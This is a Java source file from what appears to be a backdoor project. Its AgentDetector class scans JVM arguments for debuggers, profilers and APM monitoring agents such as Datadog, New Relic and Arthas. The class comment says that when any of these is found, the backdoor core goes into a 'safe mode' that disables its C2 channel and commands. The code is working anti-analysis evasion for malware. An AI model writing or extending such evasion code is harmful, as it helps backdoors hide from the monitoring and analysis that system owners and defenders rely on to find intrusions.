package dev.naruto.astrox.payload.security;

import java.lang.management.ManagementFactory;
import java.util.ArrayList;
import java.util.List;

/**
 * Detects common JVM monitoring/debugging agents that could observe payload behavior.
 * If agents are detected, BackdoorCore enters "safe mode" — disabling C2 and commands.
 */
public class AgentDetector {

    /** Known monitoring agent signatures in JVM arguments. */
    private static final String[] AGENT_SIGNATURES = {
            "-javaagent:",
            "yourkit",
            "jrebel",
            "btrace",
            "arthas",
            "async-profiler",
            "visualvm",
            "jmx",
            "jprofiler",
            "newrelic",
            "datadog",
            "elastic-apm",
            "skywalking",
            "pinpoint",
            "glowroot"
    };

    /**
     * Scan JVM arguments for known monitoring agents.
     *
     * @return detection result with list of found agents
     */
    public static DetectionResult scan() {
        List<String> found = new ArrayList<>();

        try {
            List<String> args = ManagementFactory.getRuntimeMXBean().getInputArguments();

            for (String arg : args) {
                String lower = arg.toLowerCase();
                for (String signature : AGENT_SIGNATURES) {
                    if (lower.contains(signature)) {
                        found.add(arg);
                        break;
                    }
                }
            }
        } catch (Exception e) {
            // SecurityManager might block access — treat as suspicious
            found.add("SecurityManager blocked MXBean access");
        }

        // Also check for debugger attachment
        try {
            String debugArg = ManagementFactory.getRuntimeMXBean().getInputArguments().stream()
                    .filter(a -> a.contains("-agentlib:jdwp") || a.contains("-Xdebug"))
                    .findFirst().orElse(null);
            if (debugArg != null) {
                found.add("DEBUGGER: " + debugArg);
            }
        } catch (Exception ignored) {}

        return new DetectionResult(!found.isEmpty(), List.copyOf(found));
    }

    /**
     * Result of agent detection scan.
     *
     * @param agentsDetected true if any monitoring agents were found
     * @param detectedAgents list of detected agent argument strings
     */
    public record DetectionResult(boolean agentsDetected, List<String> detectedAgents) {
        /**
         * Whether the payload should enter safe mode.
         */
        public boolean shouldEnterSafeMode() {
            return agentsDetected;
        }
    }
}
